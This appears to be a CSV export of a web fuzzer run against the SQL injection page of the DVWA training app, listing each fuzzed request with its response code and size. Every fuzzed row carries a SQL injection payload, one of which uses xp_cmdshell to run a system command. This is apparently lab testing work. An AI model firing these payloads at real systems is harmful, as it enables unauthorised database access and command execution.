Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
0,Original,Sat Aug 29 17:59:41 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit,200,OK,4,480,0,328,4544,Medium,,[]
2,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a%27+&Submit=Submit,200,OK,34,484,0,338,160,,,[a%27+]
4,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a%27+or+1%3D1%3B+--&Submit=Submit,200,OK,30,498,0,338,162,,,[a%27+or+1%3D1%3B+--]
12,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+and+1%3D%28select+count%28*%29+from+tabname%29%3B+--&Submit=Submit,200,OK,35,536,0,337,162,,,[x%27+and+1%3D%28select+count%28*%29+from+tabname%29%3B+--]
5,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%40&Submit=Submit,200,OK,75,482,0,327,4485,,,[%40]
13,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+and+members.email+is+NULL%3B+--&Submit=Submit,200,OK,32,515,0,338,162,,,[x%27+and+members.email+is+NULL%3B+--]
14,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+or+full_name+like+%27%25bob%25&Submit=Submit,200,OK,29,514,0,314,55,,,[x%27+or+full_name+like+%27%25bob%25]
8,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%3F+or+1%3D1+--&Submit=Submit,200,OK,37,494,0,327,4485,,,[%3F+or+1%3D1+--]
7,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27+and+1%3D0%29+union+all&Submit=Submit,200,OK,47,505,0,338,171,,,[%27+and+1%3D0%29+union+all]
9,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+and+userid+is+NULL%3B+--&Submit=Submit,200,OK,33,508,0,338,162,,,[x%27+and+userid+is+NULL%3B+--]
1,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a&Submit=Submit,200,OK,69,480,0,328,4485,,Reflected,[a]
6,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%3F&Submit=Submit,200,OK,54,482,0,328,4485,,,[%3F]
3,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a%27+--&Submit=Submit,200,OK,57,486,0,338,160,,,[a%27+--]
16,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27%3B+exec+master..xp_cmdshell+%27ping+172.10.1.255%27--&Submit=Submit,200,OK,680,536,0,338,206,,,[%27%3B+exec+master..xp_cmdshell+%27ping+172.10.1.255%27--]
11,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=anything%27+or+%27x%27%3D%27x&Submit=Submit,200,OK,1690,508,0,328,4867,,,[anything%27+or+%27x%27%3D%27x]
10,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+and+email+is+NULL%3B+--&Submit=Submit,200,OK,1690,507,0,338,162,,,[x%27+and+email+is+NULL%3B+--]
15,Fuzzed,Sat Aug 29 18:03:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=23+or+1%3D1%3B+--&Submit=Submit,200,OK,2715,496,0,328,4485,,,[23+or+1%3D1%3B+--]
